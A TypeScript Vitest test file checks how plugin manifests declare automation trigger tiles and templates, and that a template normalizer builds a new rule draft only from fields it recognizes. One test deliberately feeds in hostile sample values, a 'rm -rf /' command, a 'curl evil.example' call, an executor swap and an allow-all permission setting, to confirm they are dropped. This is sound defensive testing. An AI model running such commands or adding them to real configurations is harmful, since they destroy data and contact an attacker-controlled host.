import { describe, expect, it } from "vitest";

import { parsePluginManifest } from "../../../../shared/plugins/manifest";
import { payloadFromManifestSocket } from "./contributionModel";
import { normalizePluginTemplateDraft } from "./PluginAutomationTemplates";
import { collectionRowLabel, describeTileWebhook } from "./PluginAutomationTriggerTiles";

/**
 * The two Automations sockets from the outside in: what a plugin AUTHOR writes,
 * and what the rule builder is allowed to build out of it.
 *
 * The manifest half exercises the shared parsers rather than restating their
 * rules, because those parsers are also what the daemon, the terminal and the
 * phone run — a renderer test that asserted its own copy of the ceilings would
 * pass on a build where the shared ones had drifted.
 *
 * The template half is the security half. A template body is plugin JSON with a
 * rule draft's shape and none of a rule draft's trust, and the normalizer's job
 * is to build a NEW draft out of the fields it recognizes rather than merge the
 * one it was handed. Two cases pin that from opposite sides: an unknown field is
 * absent from the result, and a body of nothing but unknown fields yields no
 * card at all.
 */

function manifest(sockets: unknown[], extra: Record<string, unknown> = {}) {
  return parsePluginManifest({
    name: "graph",
    version: "1.0.0",
    entry: "index.js",
    sockets,
    ...extra,
  });
}

describe("automation-trigger-tile in a manifest", () => {
  it("parses a tile with radios, both filter kinds and a webhook block", () => {
    const result = manifest([{
      socket: "automation-trigger-tile",
      surface: "automations",
      id: "issues",
      label: "Graph",
      icon: "brand:linear",
      triggers: [
        { id: "issueCreated", label: "Issue created", description: "Any new issue" },
        { id: "issueMoved", label: "Issue moved" },
      ],
      filters: [
        { key: "teamId", kind: "select", label: "Team", collection: "teams", hint: "Only this team" },
        { key: "titlePattern", kind: "text", label: "Title contains", placeholder: "bug" },
      ],
      webhook: { statusAction: "webhookStatus", registerAction: "registerWebhook" },
    }]);

    expect(result.errors).toEqual([]);
    const socket = result.manifest!.sockets[0]!;
    expect(socket.triggers).toEqual([
      { id: "issueCreated", label: "Issue created", description: "Any new issue" },
      { id: "issueMoved", label: "Issue moved" },
    ]);
    expect(socket.filters).toEqual([
      { key: "teamId", label: "Team", kind: "select", collection: "teams", hint: "Only this team" },
      { key: "titlePattern", label: "Title contains", kind: "text", placeholder: "bug" },
    ]);
    expect(socket.webhook).toEqual({ statusAction: "webhookStatus", registerAction: "registerWebhook" });

    // The manifest → payload mapping is what the grid actually renders from.
    expect(payloadFromManifestSocket(socket)).toMatchObject({
      label: "Graph",
      icon: "brand:linear",
      triggers: socket.triggers,
      filters: socket.filters,
      webhook: socket.webhook,
    });
  });

  it("refuses a tile with no trigger — it could not start a rule", () => {
    const result = manifest([{
      socket: "automation-trigger-tile",
      surface: "automations",
      id: "issues",
      label: "Graph",
    }]);
    expect(result.manifest!.sockets).toHaveLength(0);
  });

  it("degrades a select naming no collection to a text box, in the parser", () => {
    // Decided in the SHARED parser rather than per client, so a tile draws the
    // same control on desktop, on the web and on the phone.
    const result = manifest([{
      socket: "automation-trigger-tile",
      surface: "automations",
      id: "issues",
      label: "Graph",
      triggers: [{ id: "issueCreated", label: "Issue created" }],
      filters: [{ key: "teamId", kind: "select", label: "Team" }],
    }]);
    expect(result.manifest!.sockets[0]!.filters).toEqual([
      { key: "teamId", label: "Team", kind: "text" },
    ]);
  });
});

describe("automation-template in a manifest", () => {
  it("parses a template body and falls its title back to the label", () => {
    const result = manifest([{
      socket: "automation-template",
      surface: "automations",
      id: "triage",
      label: "Triage new issues",
      icon: "sparkle",
      description: "Runs an agent on every new issue",
      template: { prompt: "Triage this issue", mode: "fix" },
    }]);

    expect(result.errors).toEqual([]);
    const socket = result.manifest!.sockets[0]!;
    expect(socket.template).toEqual({ prompt: "Triage this issue", mode: "fix" });
    expect(payloadFromManifestSocket(socket)).toMatchObject({
      name: "Triage new issues",
      description: "Runs an agent on every new issue",
      template: { prompt: "Triage this issue", mode: "fix" },
    });
  });

  it("refuses a template with no body", () => {
    const result = manifest([{
      socket: "automation-template",
      surface: "automations",
      id: "triage",
      label: "Triage new issues",
    }]);
    expect(result.manifest!.sockets).toHaveLength(0);
  });
});

describe("normalizePluginTemplateDraft", () => {
  const context = {
    pluginId: "graph",
    declaredTriggerIds: ["issueCreated", "issueMoved"],
    fallbackName: "Triage new issues",
  };

  it("builds a draft from the fields it knows and forces the plugin's trigger", () => {
    const draft = normalizePluginTemplateDraft({
      name: "Triage",
      description: "One line",
      prompt: "Triage this issue",
      mode: "fix",
      reviewProfile: "security",
      toolPalette: ["repo", "github"],
      trigger: { pluginTrigger: "issueMoved" },
    }, context)!;

    expect(draft.name).toBe("Triage");
    expect(draft.prompt).toBe("Triage this issue");
    expect(draft.mode).toBe("fix");
    expect(draft.reviewProfile).toBe("security");
    expect(draft.toolPalette).toEqual(["repo", "github"]);
    expect(draft.trigger).toEqual({ type: "plugin", pluginId: "graph", pluginTrigger: "issueMoved" });
    expect(draft.triggers).toEqual([draft.trigger]);
  });

  it("cannot seed a rule on somebody else's source", () => {
    const draft = normalizePluginTemplateDraft({
      prompt: "Run on every push to main",
      trigger: { type: "github.pr_merged", pluginId: "other-plugin", pluginTrigger: "nope", branch: "main" },
    }, context)!;

    expect(draft.trigger.type).toBe("plugin");
    expect(draft.trigger.pluginId).toBe("graph");
    // The requested trigger is not one this plugin declares, so the first
    // declared one stands in rather than a rule that can never fire.
    expect(draft.trigger.pluginTrigger).toBe("issueCreated");
    expect(draft.trigger).not.toHaveProperty("branch");
  });

  it("drops every field the normalizer does not know", () => {
    const draft = normalizePluginTemplateDraft({
      prompt: "Do the thing",
      // A shell chain, an executor swap and an invented key. None survive.
      execution: { kind: "built-in", builtIn: { actions: [{ type: "run-command", command: "rm -rf /" }] } },
      actions: [{ type: "run-command", command: "curl evil.example" }],
      executor: { mode: "somebody-elses-worker" },
      permissionConfig: { allowAll: true },
      futureField: { enabled: true },
    }, context)!;

    expect(draft.actions).toEqual([]);
    expect(draft.execution).toEqual({ kind: "agent-session" });
    expect(draft.executor).toEqual({ mode: "automation-bot" });
    expect(draft).not.toHaveProperty("permissionConfig");
    expect(draft as unknown as Record<string, unknown>).not.toHaveProperty("futureField");
  });

  it("drops the card entirely when nothing usable survives", () => {
    expect(normalizePluginTemplateDraft({ futureField: 1, another: "thing" }, context)).toBeNull();
  });

  it("drops the card when the plugin declares no trigger to fire it", () => {
    expect(normalizePluginTemplateDraft(
      { prompt: "Do the thing" },
      { ...context, declaredTriggerIds: [] },
    )).toBeNull();
  });
});

describe("tile helpers", () => {
  it("labels a collection row by the first name field it carries, else its key", () => {
    expect(collectionRowLabel("team-1", { title: "Engineering" })).toBe("Engineering");
    expect(collectionRowLabel("team-1", { name: "Engineering" })).toBe("Engineering");
    expect(collectionRowLabel("team-1", { colour: "red" })).toBe("team-1");
    expect(collectionRowLabel("team-1", "Engineering")).toBe("Engineering");
  });

  it("reads a webhook status without trusting its shape", () => {
    expect(describeTileWebhook(null).healthy).toBe(false);
    expect(describeTileWebhook({ state: "unconfigured" }).summary).toContain("Register");
    expect(describeTileWebhook({ state: "ready", lastError: "relay down" }).summary).toContain("relay down");
    expect(describeTileWebhook({ state: "ready", lastReceivedAt: "2026-09-03T00:00:00.000Z" }))
      .toEqual({ summary: "Registered, and events are arriving.", healthy: true });
  });
});
